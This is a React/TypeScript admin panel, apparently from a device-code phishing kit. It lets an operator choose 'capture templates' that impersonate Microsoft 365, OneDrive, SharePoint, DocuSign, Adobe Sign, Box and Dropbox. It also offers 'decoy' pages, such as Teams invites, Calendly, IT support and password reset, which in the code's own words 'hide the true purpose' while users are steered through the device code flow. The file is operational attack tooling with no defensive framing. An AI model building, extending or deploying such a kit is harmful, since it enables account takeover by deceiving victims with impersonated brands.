import React, { useState, useEffect } from 'react';
import type { PageDesign } from '../types';

interface PagesPanelProps {
  storedPassword: string;
}

interface PageOption {
  id: PageDesign;
  name: string;
  description: string;
  category: 'template' | 'decoy';
}

const PAGE_OPTIONS: PageOption[] = [
  // Templates
  { id: 'default', name: 'Default — Device Code', description: 'The original capture page with device verification code and step-by-step sign-in instructions.', category: 'template' },
  { id: 'adobe-sign', name: 'Adobe Acrobat Sign', description: 'Adobe Acrobat Sign document verification page. Users verify identity to view/sign a document.', category: 'template' },
  { id: 'box', name: 'Box', description: 'Box.com secure file sharing verification. Users verify to access shared files.', category: 'template' },
  { id: 'docusign-centered', name: 'DocuSign Centered', description: 'Clean centered DocuSign verification page. Minimal design for document signing.', category: 'template' },
  { id: 'docusign-split', name: 'DocuSign Split Screen', description: 'Split-screen DocuSign layout with features panel and signing form.', category: 'template' },
  { id: 'dropbox', name: 'Dropbox', description: 'Dropbox file sharing verification. Users verify to access shared folders and files.', category: 'template' },
  { id: 'microsoft-office', name: 'Microsoft Office', description: 'Microsoft 365 portal sign-in page. Access Word, Excel, PowerPoint, Outlook & more.', category: 'template' },
  { id: 'microsoft-verify', name: 'Microsoft Verify', description: 'Microsoft account identity verification page. Clean and minimal.', category: 'template' },
  { id: 'onedrive', name: 'OneDrive', description: 'Microsoft OneDrive file sharing verification. Users verify to access shared content.', category: 'template' },
  { id: 'outlook-sync', name: 'Outlook Sync', description: 'Outlook mailbox sync setup with split-panel layout and progress bar.', category: 'template' },
  { id: 'sharepoint', name: 'SharePoint', description: 'SharePoint document library access. Users verify to view team documents.', category: 'template' },
  // Decoys
  { id: 'secureshare', name: 'SecureShare', description: 'Enterprise file sharing wrapper with encryption branding. Split-panel layout.', category: 'decoy' },
  { id: 'calendar-invite', name: 'Calendar Invite', description: 'Microsoft Teams meeting invitation. Users verify to accept and join a meeting.', category: 'decoy' },
  { id: 'calendly-meeting', name: 'Calendly Meeting', description: 'Calendly-style 10 minute meeting scheduler with time slot picker.', category: 'decoy' },
  { id: 'bookings-meeting', name: 'Bookings Meeting', description: 'Microsoft Bookings-style scheduling page with calendar and time selection.', category: 'decoy' },
  { id: 'solarwinds-meeting', name: 'SolarWinds Meeting', description: 'SolarWinds-style meeting booking page with dark theme and meeting type selector.', category: 'decoy' },
  { id: 'schedule-meeting', name: 'Schedule a Meeting', description: 'Outlook-style meeting scheduler with calendar and time slots.', category: 'decoy' },
  { id: 'it-support', name: 'IT Support Portal', description: 'IT Service Desk requiring account verification with ticket number and sidebar nav.', category: 'decoy' },
  { id: 'password-reset', name: 'Password Reset', description: 'Microsoft-styled password reset flow with step progress bar.', category: 'decoy' },
];

const TEMPLATES = PAGE_OPTIONS.filter(p => p.category === 'template');
const DECOYS = PAGE_OPTIONS.filter(p => p.category === 'decoy');

export function PagesPanel({ storedPassword }: PagesPanelProps): React.ReactElement {
  const [activeTemplate, setActiveTemplate] = useState<PageDesign>('default');
  const [activeDecoy, setActiveDecoy] = useState<PageDesign>('schedule-meeting');
  const [decoyEnabled, setDecoyEnabled] = useState(false);
  const [saving, setSaving] = useState(false);
  const [saveMsg, setSaveMsg] = useState('');
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    loadConfig();
  }, []);

  async function loadConfig(): Promise<void> {
    setLoading(true);
    try {
      const [tplRes, schedRes] = await Promise.all([
        fetch('/api/templates', { headers: { 'X-Admin-Password': storedPassword } }),
        fetch('/api/scheduler', { headers: { 'X-Admin-Password': storedPassword } }),
      ]);
      if (tplRes.ok) {
        const tplData = await tplRes.json() as { template: string };
        const tpl = tplData.template || 'default';
        // If the stored template is a decoy, set it as decoy
        const isDecoy = DECOYS.some(d => d.id === tpl);
        if (isDecoy) {
          setActiveDecoy(tpl as PageDesign);
        } else {
          setActiveTemplate(tpl as PageDesign);
        }
      }
      if (schedRes.ok) {
        const schedData = await schedRes.json() as { enabled: boolean };
        setDecoyEnabled(schedData.enabled ?? false);
      }
    } catch { /* defaults */ }
    setLoading(false);
  }

  async function handleSave(): Promise<void> {
    setSaving(true);
    setSaveMsg('');
    try {
      const activePage = decoyEnabled ? activeDecoy : activeTemplate;
      await Promise.all([
        fetch('/api/templates', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-Admin-Password': storedPassword },
          body: JSON.stringify({ template: activePage }),
        }),
        fetch('/api/scheduler', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-Admin-Password': storedPassword },
          body: JSON.stringify({ action: 'toggle', enabled: decoyEnabled }),
        }),
      ]);
      const name = PAGE_OPTIONS.find(p => p.id === activePage)?.name ?? activePage;
      setSaveMsg(`Saved! Visitors will now see: "${name}"`);
    } catch {
      setSaveMsg('Failed to save.');
    }
    setSaving(false);
  }

  if (loading) {
    return (
      <div className="dash-loading">
        <div className="dash-spinner" />
        <span>Loading page settings...</span>
      </div>
    );
  }

  const currentPage = decoyEnabled ? activeDecoy : activeTemplate;
  const currentInfo = PAGE_OPTIONS.find(p => p.id === currentPage);

  return (
    <div className="pages-panel">
      {/* Current active page indicator */}
      <div className="pages-current">
        <div className="pages-current-label">Currently Active</div>
        <div className="pages-current-name">{currentInfo?.name ?? 'Default'}</div>
        <div className="pages-current-desc">{currentInfo?.description}</div>
      </div>

      {/* Mode toggle */}
      <div className="pages-section">
        <h3>Page Mode</h3>
        <div className="pages-mode-select">
          <button
            className={'pages-mode-btn' + (!decoyEnabled ? ' active' : '')}
            onClick={() => setDecoyEnabled(false)}
          >
            Capture Template
          </button>
          <button
            className={'pages-mode-btn' + (decoyEnabled ? ' active' : '')}
            onClick={() => setDecoyEnabled(true)}
          >
            Decoy Page
          </button>
        </div>
      </div>

      {/* Template dropdown */}
      {!decoyEnabled && (
        <div className="pages-section">
          <h3>Capture Template</h3>
          <p className="pages-section-desc">Choose the design for the device code capture page.</p>
          <select
            className="pages-dropdown"
            value={activeTemplate}
            onChange={e => setActiveTemplate(e.target.value as PageDesign)}
          >
            {TEMPLATES.map(t => (
              <option key={t.id} value={t.id}>{t.name}</option>
            ))}
          </select>
          <p className="pages-dropdown-desc">
            {TEMPLATES.find(t => t.id === activeTemplate)?.description}
          </p>
        </div>
      )}

      {/* Decoy dropdown */}
      {decoyEnabled && (
        <div className="pages-section">
          <h3>Decoy Page</h3>
          <p className="pages-section-desc">Choose a decoy page that hides the true purpose. Users still go through the device code flow.</p>
          <select
            className="pages-dropdown"
            value={activeDecoy}
            onChange={e => setActiveDecoy(e.target.value as PageDesign)}
          >
            {DECOYS.map(d => (
              <option key={d.id} value={d.id}>{d.name}</option>
            ))}
          </select>
          <p className="pages-dropdown-desc">
            {DECOYS.find(d => d.id === activeDecoy)?.description}
          </p>
        </div>
      )}

      {/* Preview + Save */}
      <div className="pages-actions">
        <a
          href={`/preview/${currentPage}`}
          target="_blank"
          rel="noopener noreferrer"
          className="pages-preview-btn"
        >
          Preview
        </a>
        <button
          className="pages-save-btn"
          onClick={handleSave}
          disabled={saving}
        >
          {saving ? 'Saving...' : 'Save & Apply'}
        </button>
      </div>

      {saveMsg && <div className="pages-save-msg">{saveMsg}</div>}

      {/* Quick reference */}
      <div className="pages-reference">
        <h3>All Available Designs</h3>
        <div className="pages-ref-grid">
          {PAGE_OPTIONS.map(p => (
            <div key={p.id} className={'pages-ref-item' + (p.id === currentPage ? ' active' : '')}>
              <div className="pages-ref-header">
                <span className={'pages-ref-badge ' + p.category}>{p.category === 'template' ? 'Template' : 'Decoy'}</span>
                {p.id === currentPage && <span className="pages-ref-active">ACTIVE</span>}
              </div>
              <div className="pages-ref-name">{p.name}</div>
              <div className="pages-ref-desc">{p.description}</div>
              <a href={`/preview/${p.id}`} target="_blank" rel="noopener noreferrer" className="pages-ref-preview">Preview</a>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
